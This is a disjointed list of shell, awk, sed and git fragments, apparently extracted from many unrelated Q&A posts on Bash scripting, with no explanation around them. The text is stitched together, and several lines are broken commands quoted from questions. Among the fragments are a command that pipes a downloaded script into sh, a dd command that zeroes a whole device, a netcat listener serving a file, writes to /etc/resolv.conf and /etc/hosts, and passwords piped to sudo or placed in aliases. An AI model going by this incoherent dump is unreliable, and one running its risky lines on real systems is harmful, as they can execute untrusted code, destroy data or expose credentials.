chmod 600 ~/.my.cnf
{a[$2,$1]=$3; count[$2]}
END {for (i in count) print i, a[i,"Ind1"], a[i, "Ind2"], a[i, "Ind3"]}
read var
npm install -g rexreplace
recls .
sample document.txt
sample document.txt
binary operator expected
myls_internal "$file/*"
recls_internal $file/*
recls_internal $file/*
recls_internal "$file"/*
cs 350
cs 350/Homework1.pdf 350/Homework2.pdf
cs 350/Homework1.pdf cs 350/Homework2.pdf
a "b c" "d e"
sudo apt-get install libxml2-utils
brew install xmlstarlet
sudo apt-get install xmlstarlet
echo $1
mkdir -d ${outdir}
110 30 110\272E 30\272N 110 30 LON0
110 30
110 30
/bin/sh 1>&2 2>&1
-n 32
date +'%Y-%m-%d %H:%M:%S'
Osiris JL:
gcutil push
script.sh ABC
grep X employeelist
4 s/old/new/p
ps auxww
1.1.1.1 5.4.6.3
./apache_new_vhost.sh -a -d google.com
case a)
echo '$name'
echo "$name"
gpg --gen-key --batch
sudo rngd -r /dev/random
{a[$1$2, $NF]+=$8}
a[X Attribute, Time]
END {for (i in a) print i " ==> " a[i]}
set -x
s/^.*Microsoft Office f.r Mac 2011 \([^ ]*\)-Update.*$/\1/
Microsoft Office für Mac 2011 14.4.1-Update
-f value.txt
gunicorn mysite.wsgi:application --bind 0.0.0.0:8001
"while (<>) { ...; print; }"
for x in {{0..9},{a..f}}{{0..9},{a..f}}; do mkdir -p $x/{{0..9},{a..f}}{{0..9},{a..f}}; done
find *.txt
which bash
brew doctor
export PATH="/usr/local/bin:$PATH"
brew doctor
THE FIRST ONE OF
tr -d '\n'
sed -r 's/<[^<>]*>/|/g'
sed -r 's/\|+/\|/g'
sed -r 's/\|+/\|/g'|sed -e 's/^|//' -e 's/|$/\n/'
cat xml_in|tr -d '\n'|sed -r 's/<[^<>]*>/|/g'|sed -r 's/\|+/\|/g'|sed -e 's/^|//' -e 's/|$/\n/'
-t -m '/*/*' -v 'concat(normalize-space(text()),"|")'
-m '/*/*'
-v 'concat(normalize-space(text()),"|")'
brew install xmlstarlet
sudo apt-get install xmlstarlet
awk ' !x[$0]++'
[ -n somestring ]
man bash
python2.7 -V
bash: python2.7: command not found
~/.bashrc or ~/.profile
export PATH=$PATH:/path/to/binary1:/path/to/binary2
su -
/usr/local/` so my
man bash
-j 20
-N 2
... | sort -u -V
sort -u -V
Help -> Install new software -> Add -> Archive
Run -> Debug configurations
Bash script
Window -> Preferences -> Shell script -> Interpreters
Run -> Run as -> Run shell script
Select Bash script
-i inplace
( )
--data "$ANNOTATION_INIT_DATA"
ps aux | grep python
python -u /home/user/folder/myscript.py -some Parameters
120 128
while (<>) { ... }
set -e
set -e
set +e
export FIGNORE=\~
find > list.txt
tree -a > list.txt
tree -ph > fsstruct.txt
tree -ph . -o fsstruct.txt
tree -Hph . -o tree.html
if (env | awk -F= '{print $1}' | grep -q "AA_BB_*"); then  echo 'I am in' ;fi
echo +; return
:set list
cat content | grep "an interesting parameter: " | awk '{print $4}'
awk '{ print $1 ~ /\.$/ ? "OK" : "NOK", $0 }'
help test
bash -x
XPath set is empty
~ . Enter
bash -x ./script.sh
export -f doit
$SHELL -c
cat: output.md: input file is output file
r $f
openmpi 1.6.1
epoch=$(shell date +%s)
od -c
tomcat7    Running    Monitored   3025   18d 2h 16m   3.6%   0.0%
0.0%2h 16m ing
tr -d '\r'
if [ \"\$event\" ==
proc_open(escapeshellcmd($script), ...)
find . -type f -print | tar -cvf somefile.tar -T -
2 55 0
grep -Po '(?<=href=").*?(?="[^\?])'
egrep -v '^(\?|/)'
head -6
shopt -s nullglob
bash -c
printf '%s\0'
xargs -0
-I %
bash -c
brew install rename
-N '...01'
shopt -s extglob
shopt -s nullglob
SET autocommit=0
bash 4.3+
declare -n
declare -n
bash 4.2-
printf -v
-d ''
-d ''
eval "arr$varEnvCol[index]"=...
eval arr\$varEnvCol[index]=...
* * * * * /home/pi/test.sh
shopt -s extglob
[[ ... ]]
MAC Address: 02:21:9B:88:3C:06
column 4
column 6
for file in "${@:-config/*}"
{s+=$1}END{print chr,"\t",min,"\t",max,"\t",NR,"\t",s/NR; if (S/NR == "") print chr,"\t",min,"\t",max,"\t","N/A","\t","N/A"}'
<your script>
\( \)
[ ]
echo $var | sed
man which
which mysql
clever shortcut
alias mysql="mysql -upeter -ppaula"
cp co_dispersion_base dispersion_upper_deck/Runs652/co652203.dat3
cp -v
no permission
Pattern A
/PATTERN/,/^$/{/^$/d; p}
{/^$/d; p}
/PATTERN/ {f=1}
invalid command name "0-9"
111.111.111.11 - - - foo.org [23/May/2014:01:00:15 -0400] 0
"GET /baz/bar.html HTTP/1.1" 200 3734 "http://foo.org/baz/bar.html" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36"
|paste -sd+|bc
@BYTES = (); while(<>) { push(@BYTES, $1) if ( $_ =~ qr/] (?:\d+|-) (\d+)/) }; foreach(@BYTES) { print "$_\n" }
bash scriptname < somefile
p4 -u <username> <command>
p4 login
p4 login
ps aux | grep script
echo $!
kill 1234
sleep 5m
readlink -m $SOMEFULLPATH
2>&3 ) 3>&1 )
! -newermt
-type f
cd ~
vim .bashrc
alias pip="path to pip"
locate pip
locate pip | grep bin
sudo which pip
alias pip=your/bin/path
source ~/.bashrc
man bash
man bash
file 2
PATH = $PATH:$HOME/bin
java -cp ... SomeClass
declare -a
readarray "<output_var_name>" "<input_file_name>"
t update
2>&1 |
name: nothing appropriate
column 4
column 6
sort -nu
-v var=/foo/bar
sub (/.*hello.*/,var)
nohup python server.py &
screen -dm python server.py
ps aux
sudo supervisorctl
echo -e
printf "%q"
-type f
. $(which code)
source $(which code)
ls -1
alias l='ls -F'
ls -1
ls -1
column 4
column 6
12 and 13
sort -u
sudo echo $MYVAR
/^\t#$/ {f=1;next}
f && /^\tpap$/ {print "\tpython"}
echo "${in/$'\n\t#\n\tpap\n'/$'\n\t#\n\tpap\n\tpython\n'}"
rsync --rsync-path="run util bash && rsync" -e "ssh -T -c aes128-ctr -o Compression=no -x" ./tmp root@example.com:~
split --lines=100 -d -a 3 file ''
man split
cat number.txt | sort -n | uniq -c
syntax error in conditional expression: unexpected token
shopt -s extglob
grep | awk
exec script2
exec ls
shift 2
find ./ -type f -exec ls \;.
git checkout
git checkout <yourbranch>
git bisect
git bisect
git checkout HEAD~16
git checkout HEAD~32
git checkout HEAD~64
tail -f
tail -f
-n 1000000
sort -m
$ echo -e '\ud83c\udf7a'
echo -e
screen -c screens
ubprocess.check_output(same as popen arguments, **kwargs)
EXEC RETYE
EXEC RETYE
./run -c -p '$' -s 10 file.txt
./run -p '$' -s 10 file.txt
./run '$' -s 10 file.txt
"${@: -1}"
START HELLO
START STACK
START HELLO
START HELLO
START STACK
find . -name '*.ext1' -o -name '*.ext2' -exec blah
find . '(' -name '*.ext1' ')' -o '(' -name '*.ext2' -exec blah ')'
arp -a
| tac
head -n2
joe /etc/passwd
caffeinate -s /path/to/your/script
os.putenv(key, value)
{print $(NF-1)}
ll *.dat > output.txt
num of links value
ls -l
ls -l
man find
man bash
[[ ! $str1 =~ $str2 ]]
[[ ! str1 =~ str2 ]]
( [[ ! $str1 =~ $str2 ]] )
[[ ! $str1 =~ $str2 ]]
[[ ! $str1 =~ $str2 ]]
grep -Po '(?<=">)(.)*(?=<\/doc>)' F1.txt
field1=name; field2=surname; field3=mobile phone; field4=email; field5=office phone; field6=skype
{for (i=1; i<=NF; i+=6) {print $(i), $(i+1), $(i+2), $(i+3), $(i+4), $(i+5)}}
crontab -
crontab -e
man crontab
man 5 crontab
man launchd.plist
man crontab
^A d
screen -ls
env MC_PID=$! &
(sleep 1; startserver_after)
w_pos=(1.000 1.477 1.790 0.580)
[[ $col2 =~ ^[0-9] ]]
declare -p
read ans
read $ans
npm install -g yo
npm ERR! Please try running this command again as root/Administrator.
sudo npm install -g yo
$ su
$ npm install -g yo
javac -d bin -cp lib/*: -sourcepath src src/com/rs/*.java
PS1='$PWD: '
PS1="$PWD: "
ls -l | tail -n +2 | cut -c 46-
echo $now_playing > .last-played
Oldest, ..., Newest
ls -tr
man bash
[[ expression ]]
man rsync
git diff
column -t
echo itsme | sudo -S lvremove #{snap_name}
$ git help <cmd>
$ git <cmd> --help
echo "Enter your path: ";read path
if (NR==1) {min=d}
END{for (i=min; i<=max; i++) print i, "-", i+1, a[i]+0}
. $1
$A != #*
sed -n '15689,15696p'
read -a
echo $@
echo $*
print %q "$@"
ip route get 8.8.8.8 | awk '{print $NF;exit}'
GNU grep
wget foo | sed bar
-O -
< <(...)
cat a/${last_folder}/<my file>
a/5/<my file>
a/1 a/2 a/3 a/4 a/5
echo Hello World
echo 'Hello World'
echo Hello      World
echo $var
bash -x compile_less.sh
> filename
git bash
git rev-parse --show-toplevel
git rev-parse --git-dir
git rev-parse --git-dir
do shell script
bin/sh: virtualhost.sh command not found
do script with command
do script with command
do shell script "command" with administrator privileges
$ pgrep -f vmware
sudo kill -9 4751
sh sudokiller.sh vmware
-type f
tr "HTML" "test"
$CDP = False
os.system(), os.popen() or os.fork() and os.execv().
file -l
sed 's/^[0-9]{0,13}\x00//g'
pi@raspberrypi ~$_
#!/bin/sh -e
'$X >= Y {print}'
| cat > file
man awk
xmlstarlet ... < <(echo "<root>"; cat test.xml; echo "</root>")
Hello world, I need vacation
while [ "$1" != "" ]
if [ "$1" != "" ]
-type f
-name '*[0-9]*
find ~ -type f ! -name '*[0-9]*' -name '*txt'
grep -A 4 '^>' keyword
set -e
-v key=...
print $5
set -x
<command> "$ARRAY[@]"
egrep | sed
egrep | sed
-u 3
<< file
logger "loop"
while :
sleep 120
if [ $CDAY !=$(date +"%d") ]
if [ $CDAY != $(date +"%d") ]
dedent text
text="this is line one\n \
exec('cat err.txt',$out)
user name "username" password "password"
do shell script
+ 0
curl -F
sed -e 's/^ //' | sed -e 's/ $//'
tr -d ' '
ifconfig eth0 | awk '/inet addr/{print substr($2,6)}'
ifconfig eth0 | awk '/inet addr/{sub(/[^0-9]*/,""); print $1}'
ifconfig eth0 | awk '/inet /{sub(/[^0-9]*/,""); print $1}'
ifconfig eth0 | grep -oP '(?<= inet addr:)[^ ]+'
(?<= inet addr:)
inet addr:
[^ ]+
| head -n1
ifconfig INTERFACENAME
ifconfig eth0 | grep -E ... 
grep -v 127.0.0.1
ip route ...
hostname -I
ifconfig en0 ...
python -c 'import socket; print(socket.gethostbyname(socket.gethostname()))'
ifconfig | grep 'inet addr:' | grep -v 127.0.0.1 | head -n1 | cut -f2 -d: | cut -f1 -d ' '
inet addr:
gawk -f [scriptfile from above] < data.txt
. "$script_name"
source "$script_name"
var="foo bar.mp4 baz.mp4"
while read
grep "^Error"
grep "NotAuthorized"
grep -v "XXX"
works when pointed at the home folder but not the
"nameserver 8.8.8.8"
"echo nameserver 8.8.8.8"
>> /etc/resolv.conf
echo nameserver 8.8.8.8 >> /etc/resolv.conf
su -c
grep -f
man grep
-f file, --file=file
grep -f
O(n * log(n))
xargs -n1
ps auxw | grep procname | grep -v grep | wc -l
test.sh -t test -r server -p password -v 1
cat file.txt | sed "s/'//g" | while read i j; do echo "$i '$j'"; done
^( *)
([^ ]+)
( +)
printf "%s '"'"'", $1;
for (i=2; i<NF; ++i) printf "%s ", $i;
print $NF "'"'"'"
^( +)
-v q="'"
print f1, q substr($0,2) q
Permission Denied.
lsattr /zzz_delete/.git/objects/tmp_object_git2_a03228
----i--------   tmp_object_git2_a03228
"$(cat tempFile.txt)"
grep -o .
sh -c "command"
echo x | read y
line=$( read < file && echo "$REPLY" )
sh -c ...
echo $BASHPID, $BASH_SUBSHELL
"echo $BASHPID, $BASH_SUBSHELL"
"echo $BASHPID, $BASH_SUBSHELL"
'echo 28860, 0'
sh -c 'echo 28860, 0'
sh -c 'echo $BASHPID, $BASH_SUBSHELL'
echo $BASHPID, $BASH_SUBSHELL
sh -c "echo $BASHPID, $BASH_SUBSHELL"
man bash
man bash
Shell Expansions
Parameter Expansion
xargs -I@
Segmentation fault (core dumped)
grep "^[0-9 ]"
top -u
this is the first line
sed -E 's/"/cp /; s/",/\// ; s/,/ /;s/\\/\//g' test.csv | /bin/bash
sed -E 's/"/cp /; s/",/\// ; s/,/ /;s/\\/\//g' test.csv | less
My Windows Like Dir Name
awk -F',' '{gsub(/"/, "", $1); gsub(/\\/, "/", $1); print "cp \""$1"/" $2"\" \"" $3"\""}' test.csv  | /bin/bash
awk -F',' '{gsub(/"/, "", $1); gsub(/\\/, "/", $1); printf ("cp \"%s/%s\" \"%s\"\n",$1,$2,$3)}' test.csv | /bin/bash
| head -n 10
echo -ne
df -H
Mounted on
sh yourfile
bash yourfile
"scp %s user@server:~/place/%s"
gāodī (SWAC_ALPHAIDX)
高低 (SWAC_TEXT)
[[ ... ]]
bash /usr/local/src/backupcheck.sh
[[ ... ]]
[ ... ]
[[ ... ]]
exit 1
bash --login
rvm use 2.0.0
[[ -s "$HOME/.rvm/scripts/rvm" ]] && . "$HOME/.rvm/scripts/rvm"
source ~/.rvm/scripts/rvm
~/.your_shellrc file
script param1 'param 2 with spaces'
ssh user@remotehost script param1 \'param 2 with spaces\'
script param1 'param 2 with spaces'
0 2 4 6 etc
1 3 5 7 etc
gnu awk
FPAT="[^' ]+|'[^']+'"
[^' ]+
'test data'
echo $str > file
dpkg -i ...
rpm -qi
dpkg -p {package}
dpkg -p lsof
netstat -an | grep -c 3306
test1_R1.fastq.gz test1_R2.fastq.gz test2_R1.fastq.gz test2_R2.fastq.gz
ins=$(ls *.fastq.gz | sed 's/..fastq.gz/\*/g' | sort -u)
test1_R1.fastq.gz test1_R2.fastq.gz test2_R1.fastq.gz test2_R2.fastq.gz
test1_RR* test2_RR*
cat /tmp/file.txt
echo $line
while :
man expect
5 minutes
multiple processes
php script
bash script
[ $RESULTS = "1" ]
$(cat $RESULTS) = "1"
mkdir -p /tmp/root
logFile = $OPTARG
mv test test
mv test test
mv test/* .
s = br.readLine()
printf '%s'
pkill $!
sleep 1
$ subl ~/.bashrc
-bash: subl: command not found
$ ~/bin/subl ~/.bashrc
/bin/sh -c 'myscript...'
sudo echo "$HTTP["url"]" >> file.conf
cp -p
bundle install
bundle exec rake db:migrate
bundle install
cat -A
--transform Sshd.lns incl /etc/ssh/sshd_config
ps -aux | awk ' /^user/ { system("pstree " $2) }'
ps -aux
GNU sed
a  b  c
'a  b  c'
'a' 'b' 'c'
a b c
echo $fileList
echo f1 f2 f3
echo "$foo"
echo $foo
ls /: No such file or directory
ls /
awk -v awk_var="$shell_var" ...
ps -p <pid> -o ppid=
[[ ]]
[[ ]]
[[ ]]
{ }
( )
( )
{ }
[[ ]]
top -b | awk '{print $NF}' > output.txt
find . -name '*.txt' -printf '%h\n'
man find
-type f
column -t
's/^/    /'
local s=$(printf '%*s' $1 "")
>chrM gi|251831106|ref|NC_012920.1|
$ awk -f seqlen.awk -v target=chrM seq.fa
dir=$dir, name=$name
ssh <remote-server>
I_love_function () { }
function func_name { }
VALUES ($a, 1, $c, $c, 0, 0);
su (username)
select count(*) from <tblName>
date +"%Y-%m-%d"
date +"%Y-%m-%d"
compgen -f
compgen -f
declare -f _filedir
comptopt -o
compgen -f
-v OFS
Cmd> <whatever>-append_something
$k = s/(.*?,){3}//r
print if !$seen{$k}++
/etc/profile 
&> all.txt
2> stderr.txt
exec cat >> mail
<div class="classname"><a href="/URL"><img src="${asset.image/url}" alt="TEXT" class="another-class-name" ></a></div>
<div class="classname"><a href="/URL-EXAMPLE-ONE"><img src="${asset.image/url}" alt="TEXT" class="another-class-name" ></a></div>
<div class="classname"><a href="/url-example-one)"><img src="${asset.image/url}" alt="TEXT" class="another-class-name" ></a></div>
<div class="classname"><a href="/ABC (D&E)"><img src="${asset.images/common/manufacturer_logos/medium/abb-m.gif}" alt="TEXT" class="another-classname" ></a></div>
<div class="classname"><a href="/<img src="${asset.images/url}" alt="TEXT" class="another-classname" abc-d-ediv>
<div class="classname"><a href="/abc-d-e"><img src="${asset.images/url}" alt="TEXT" class="another-classname"></a></div>
/<div class="classname"><a href="\/.*">/
s/<div class="classname"><a href="\///
s/ /-/g
s/\(<div class="classname"><a href="\/\)\(.*)/\1/
<div class="classname"><a href="/URL">
"Failure to execute child process "/usr/local/bin/touchpad.sh" (No such file or directory)"
chmod +x touchpad.sh
bash /usr/local/bin/touchpad.sh
bash touchpad.sh
dos2unix touchpad.sh
tar cpzf $File --exclude "${Folder}Downloads" $Folder
-i inplace
cd # changes to home dir; e.g., '/home/jdoe'
man bash
echo ~ # outputs, e.g., '/home/jdoe'
cd "$HOME/tmp" # changes to your personal folder for temp. files
Permission denied
#service autofs stop
for i in ./new/*
diff ${i} newrpms/
$ script.sh someText
$ script.sh 'someText'
if [ -d "$DEFAULTDIRECTORY" ]; then
if [ ! -d "$DEFAULTDIRECTORY" ]; then
/sbin/ifconfig eth0
UP BROADCAST RUNNING MULTICAST
UP BROADCAST MULTICAST
ifconfig eth0
ip link show
"state UP"
"state DOWN"
ping -c 1 -w 1 ip_address &> /dev/null
ip link
grep -l
grep -v
ping -c 4
cp -n ${file}
gunzip "${file}"
find -path
chmod u+x SearchForMe.sh
./SearchForMe.sh 555-100006 2014-05-20 /log/root
(cd $d1)
1> My_Results.txt
2> My_Errors.txt
cat << EOF
cat << 'EOF'
racl whitelist default
GNU sed version 4.2.1
gunzip -c
tar -xzf ${Chosendata}
-A 1
:set wrapscan
:set wrapscan
awk '(FNR==1)&&s{print s; s=""}/PATTERN/{s=$0}END{if(s) print s}'
sudo printenv
declare -xp
who -a
who -p
var1=2014: command not found
if this line is an assignment
stty -icanon
case / esac
read --help
-s -n1
read -n1
bash /path/to/git-new-workdir
exit 1
pgrep nginx
if(!m)  print 0
command1 | command2
# ./script.sh check1.txt
|| tmpfile=/tmp/test$$
rm -f $tmpfile
kill -l
cat -A drug-disease_TTD2013.txt
set list
sed 's/\r//' drug-disease_TTD2013.txt >1.t
-v use ^ and M- notation, except for LFD and TAB
date ; timeout 2 sleep 10 ; date
man timeout
info coreutils timeout
ps aux | grep YOURPATTERN |grep -v grep | awk '{print $2}'
grep -v grep
awk '{print "kill "$1}'
for loop
"2014-06-02 16:23:13+02:00"
date -d"2014-06-02 16:23:13+02:00" +%s
Red Hat Enterprise Linux Server release 6.5 (Santiago)
coreutil 8.4
$num = C0
man bc
A = 10
echo temp | sort -n | uniq -c | awk '{ print $2, $1 }' > temp2
<( ... )
FNR == NR
{ XE }
crontab -e
crontab -e
echo -n "$originalString"
echo -e
printf %q
printf %b
printf %q
:! ack-grep "function tracking" ../
vim -addtab <some file>
:r ! ack-grep "function tracking" ../
Control-W, gf
:grep! "function tracking" ../**/*
:grep! "function tracking" ../**/*
:grep "function tracking" ../**/*
let g:ack_use_dispatch=1
nmap <silent> \` :QFix<CR>
ctags -R
sed 's/^API//g'
local -a 'xkeys=("${!'"$1"'[@]}")'
e() { echo 'xkeys=("${!'"$1"'[@]}")' 'ykeys=("${!'"$2"'[@]}")'; }; e a b
xkeys=("${!a[@]}") ykeys=("${!b[@]}")
echo {0..5} vs. "{0..5}"
tar -ztvf  "opt/colorado/archive/IMPORT_201406.tar.gz"
tar (GNU tar) 1.26
man find
man find
set -x
#!/usr/bin/env bash
"bash -x"
./script.sh beta
./script.sh whatever
-k1 -k2
ls | md5sum
cat * | md5sum
node -e
seq 1 1000000 | while read i; do echo -en "\r$i"; done
$| = 1;
$| = 1
<span class="user">User Name</span>
-i ""
cd ~/workspace
cd workspace
shopt -s expand_aliases
HOME=/somewhere/else cd
cat tmpfile.link
cat: tmpfile.link: No such file or directory
some_executable (deleted)
<filename> (deleted)
<filename> (deleted)
indirect variable expansion
scp remote_user@remote_server:/path/to/files /dir/to/copy
man scp
new ssh module
grep -f ../listOfFiles.txt p*.txt
read LINE < ../listOfFiles.txt; echo $LINE
grep -i 'feature number' oneOfTheFiles.txt
read -r
: >outputFile.txt
rm -f outputFile.txt
grep -h
-e "$a" -e "$b" -e "$c"
read var
read $var
> output.json
man curl
-i, --include
grep -q
exec 3>&1
do something 2>&1 1>&3
exec 3>&-
exec 3>&1
$symlink_directory = /opt/wordpress/plugins/all-in-one-seo
$sym_plugin_directory = /all-in-one-seo
rm -rf $var1
ln -s $var1 $symlink_directory
screen -r SERVER
screen -r
ps -p $pidchild
screen -r
Not a tty
node debug <script>
search google chrome
apt-cache show
#ForwardX11 no
ForwardX11 yes
Host *
#ForwardX11 no
GSSAPIAuthentication yes
ForwardX11Trusted yes
man ssh_config
echo $RANDOM | cat
tr SET1 SET2
' '
'\ '
"$newfile" "$file" "$tempfile"
which php
convert *.jpg name.pdf
while read d
convert ${d}/*.jpg
grep -v
-n 1
"grep -v"
#!/usr/bin/env bash
define alias I_am_only_ls_alias
I_am_only_ls_alias: command not found
grep -P
wget -qO- remote_script.sh | sh
read -p "Prompt" yn
-j 50
-n 500
rsync server
man rsyncd.conf
wait -n -p PID
--date=' '
find . -name *.extension1 -o -name *.extentions2
20140411141231 20140605075650
For GET_TIME in $Get_einlag_time
sed -i "$deb,$end"'d' body.txt
./program <(zcat data.txt.gz)
zcat data.txt.gz
while true; do nc -l -p 1234 -c "zcat myfile.tar.gz"; done
nc localhost 1234
nc localhost 1234
cd x; cd -
Electric company name - bill - 2014-03-22.pdf
chmod +x
[[ $d = ????-??-?? ]]
ls -1
ls -1
crontab -e
history -r
rv=$(mkdir lib)
== $'-file-control,loggernet datalogger locked\r'
[ ]
input file is output file
pkill -2 node /usr/local/bin/sails
pkill -SIGINT node /usr/local/bin/sails
application:  2my-appid
. example.sh
ls -l
system-config-network-cmd -e
bash function
for loop
bash for
read -s STR
read -t 1
stty igncr
stty sane
stty -icrnl
tr -d '\r'
tr 'abc' 'xyz'
a->x, b->y, c->z
sed 's:/:\\/:g'
sed s:/:\\\\/:g
package installer
shell script
objective c
echo length ${#availableb[*]}
-bash: $log_file: ambiguous redirect
set -x
sed -n /"b"/,/"d"/p final.txt
a, b, c...
'Cannot proceed: the database is empty'
sed -f
sed -i
$x_time is 7
first block
18, the second block
21, the *)
[[ ]]
(( ))
operator: 'finger ${USER}|grep Name:| cut -f3 -d:(${USER})\n
tar -xf
grep -l -R
$20"" > d
$20 > d
$telnet 192.168.12.1 25
$echo -ne "EHLO domain.com\r\f"
250 OK
for (i=3; i<=NF; i++) print $1, $2, $i
"curl: (6) Couldn't resolve host 'application'"
$( ... )
dd if=test.dd bs=512 ...
echo "asasa" | fun1
echo $1
head $1
echo "asasa" | fun1 "var1"
echo $1
head $1
<arg value="..."/>
<arg line="..."/>
Cycle 1: 30662 ms, 117.41 W
pidof shred
echo "Shredding Completed...
echo "Shredding Running..."
"Shredding Completed..."
&& break
dd if=/dev/zero of=device bs=4M
while loop
shopt -so posix; set
shopt -so posix
egrep "^${prefix}[^ =]*="
while IFS='=' read -r name rest
[[ $(declare -p "$name" | cut -d' ' -f2) == *a* ]]
declare -p
(( isArray )) && name="$name[@]"
echo "${!name}
> "$outDir/$fname"
+ [ '' == freebsd ]
set -x
[ ... ]
[ ... ]
[ "$recdate" = "freebsd" ]
$(( ... ))
Ubuntu 14.04
unrar x test.rar '-pSei49b4axq!zx' id
unrar x test.rar -pSei49b4axq!zx id
set -x
set -x
s/stWgvN52??f2&amp; ?&quot;
-name \"*.php\"
-name '*.php'
sudo apt-get install libjpeg62 libxss1
/bin/bash --login
path\to\msys64\bin\bash.exe --login
profile_d ()
java -Xmx4G -Xms4G -jar spigot.jar
chmod a+x ./spigot.sh
/bin/sh ./spigot.sh
tmux a -t session-name
man tmux
mv -- "$f" "${f/_*_/_}"
man bash
Pattern Matching
brew install rename
man rename
brew install rename
for i in $(cmd)
"$A / $B"
ls -la
-name \${CHAR}*
vzctl set containerID --hostname server.domain.com --save
echo "$d1"
echo "$d2"
shift $((OPTIND-1))
sed '69,70d' /etc/bash.bashrc
| cat > /etc/bash.bashrc
head -n -<n>
sed -i
readlink -f
man readlink
ls -l
[sudo] npm install -g rreadlink
mkdir -p
$2 ";' $5 ";' $6 ";' $9 ";"
'{print '
' }'
cut -5,7-
delim = "\t"
wait [sec]
cat server.conf | sed -n 's/.*uuid = "\(.*\)",/\1/p'
sudo port install ctags
which ctags
bash --version
bash script.sh
printf -v
while [$i="y"]
while [[ $i == "y" ]]
[[ ... ]]
[ ... ]
[ ... ]
[[ ... ]]
sum=expr $a+$b | bc
sum=$(expr $a+$b | bc)
expr "$a" + "$b"
sum=$(( a + b ))
[[ ... ]]
sum=$(echo "$a + $b" | bc)
echo "Summation:" $sum
echo "Summation: $sum"
[[ $i != "y" ]]
echo "Bye"
exit 0
for i in {A..Z}
echo {A..Z}
echo {A..Z}{A..Z}
./script 10
./script 26
./script 52
./script 78
echo {A..Z}{A..Z}
SET GLOBAL FOREIGN_KEY_CHECKS=0
aplay --help
bad substitution
word1 word2 word3
"A> "
`cmd args`
cmd args
"`cmd args`"
$(cmd args)
"$(cmd args)"
[[ ]]
[ ]
exec firefox
:! ...
Press enter to continue
sed -r 's/([[:digit:]]+(\,[[:digit:]]+(\.[[:digit:]]+)?))-/-\1/'
grep -Ri 'asrv-a.akamaihd.net' /
system("cd /home/user")
system("sh -c 'cd /my/dir'")
man tac
man rev
GNU sed 4.2.1
spawn ssh root@$Test_ip \". /test_machine/script_2.sh\"
"/test_machine/script_2.sh: No such file or directory"
bash removeunusedimages.sh
cp "$i.foo.$i\bar" out
( and )
while(<>){...; print}
exit 1
$(CXX) $(CFLAGS) -o $@ -c $< $(MAKEDEP) $(INCLUDES)
tarsnap --list-archives
export PASSORD=
-I %
perl -ple 's|({“user)|\n$1|g' |sed -re 's/^\[|\]$//g' | sed -re '/^$/ d'
grep -c [[:upper:]] a.txt
npm adduser
ccred=$(shell echo -e "\033[0;31m")
$$(echo -e '$(ccred)')
ccred=echo -e "\033[0;31m"
echo "${PIPESTATUS[0]}"
$(COMPILE_cpp) 2>&1 | sed ...; echo "${PIPESTATUS[0]}"
; exit "${PIPESTATUS[0]}"
make -j
[ ]
rpm -Va
<(exec rpm -Va)
gem install --user-install
ruby -e 'p $LOAD_PATH'
((a)) and (b))))
set -e
set -e
(( and ))
set -e
help set
-e  Exit immediately if a command exits with a non-zero status.
read -r line
sleep 300
man sed
sed -i
t1, t2, t3, ..., t1500
cat t* >> all
t1, t10, t11, ...
t1, t2, t3, ...
extern char **environ;
find $FINDVAR
find ${FINDVAR}
$(find $FINDVAR)
echo $FINDVAR
set -x
set -f
4.3.11(1)-release (x86_64-pc-linux-gnu)
grep -P
> tmp
    cat <(prog $1 | buffer_until_close) > $1
ls ... | head -10
find $path/parent/ -name "*.txt" -print 2>/dev/null
echo -e "\x0a ls "
date --help
which git
find / -lname /home/user/bin/git/bin/git
s/.* //; p
{print $NF}
wc -l
wc -l
chmod +x wc.pl
while .. do .. done
cat myFile.txt
cut -f2
GENERATED ALWAYS AS
EPIC RAP BATTLE of MANLINESS-_EzDRpkfaO4.mp3
ssh -X servA
ssh -X servB
find /1999 -type f -maxdepth 1 ...
date -r "$FILE" '+%s'
locale -a
r=$(openssl rand -hex 8)
"   "
sub(/\t$/, "", a[i]);
Apache 2 Test Page
$HOSTNAME Test Page
egrep '^d'
- 2
return 2
while read
find /home/foo/bar -name /usr/local/thing.baz
absolute_file="$(find_file "$file")"
|| reset
stty echo
stty -echo
stty -a
./myrubytool ; stty echo
system("stty echo")
[[ ]]
ls *.xml
sudo apt-get install libboost-all-dev
bashrc file
cmake install location path_to_cmake/share/cmake-xxx/Modules/FindBoost
< $innerDirectory
< $file
'foo bar'
service zygote /system/bin/app_process -Xzygote /system/bin --zygote --start-system-server
service zygote /system/bin/sh /system/bin/app_process -Xzygote /system/bin --zygote --start-system-server
/thismarker mX/,/thismarker mX/
/thismarker mX/ !
s/^/   /
echo $? #2&>1
echo $?
grep -q
man grep
sed -r G
invalid date
man date
god start worker-0
god start workers
<script type="text/javascript" src="scriptName.js"></script>
$ node -e "console.log('hello')"
$ node script.js
bin/vs-mda-remote --buildDir xxx
awk -v name=value
sort -t $\t -k1,1 2,2 <filename>
sed -i '63s/^.*$/mystring/' file.txt
exec: echo 'echo "127.0.0.1 localhost" >> /etc/hosts"'
sed "s/^.*$/something/blabla/"
10 <= x < 100
grep "^..$" query.txt | grep -v 10
.yml extension
_ {} \;
_ {}
_ {}
_ {} ;
_ {} \;
-exec command ;
grep -v expr
grep -E
bash script.sh
sh script.sh
bash --version
ls -l /proc/3657(pid here)/fd
c = a + b
[[ ... ]]
let "a = $a -1"
(( --a ))
grep -q
:chmod +x filename.sh
[[ ... ]]
[ ... ]
[[ ... ]]
[[ ... ]]
[[ 110 -gt 2 ]] && echo YES
[[ 'abc' == 'a'* ]] && echo YES
[[ 'abc' =~ ^'a'.+$ ]] && echo YES
re='^a.+$'; [[ 'abc' =~ $re ]] && echo YES  # *unquoted* use of var. $re
[[ ... ]]
ARITHMETIC EVALUATION
man bash
var=010; (( 10#$var > 9 )) && echo YES  # mandate number base 10
var=v10; (( ${var#v} > 9 )) && echo YES # strip initial 'v'
var1=10; var2=var1; (( var2 > 9 )) && echo YES
v1=0; ((v2 = 1 + ++v1)) && echo YES # -> $v1 == 1, $v2 == 2
changes the 2nd position to an A
I am currently wrapping the arguments in ''
sed: -e expression #1, char 21: Invalid content of \{\}
git bash
git difftool HEAD~ 67b8679 -- js/site/pizzabuilder.js
git difftool HEAD~ 67b8679
env | grep PATH
git diff
git add .
git add
git difftool
git reset
git difftool
git mergetool sourcetree
** it is python testing **
ptest.sh pytest.py it is python testing ptest.sh pytest.py
echo $PYTEST
find ./ -name "results.txt" | sort -k 3 -t _ -n -k 5 -n
-t _
-k3,3 -k5,5 -k 7,7
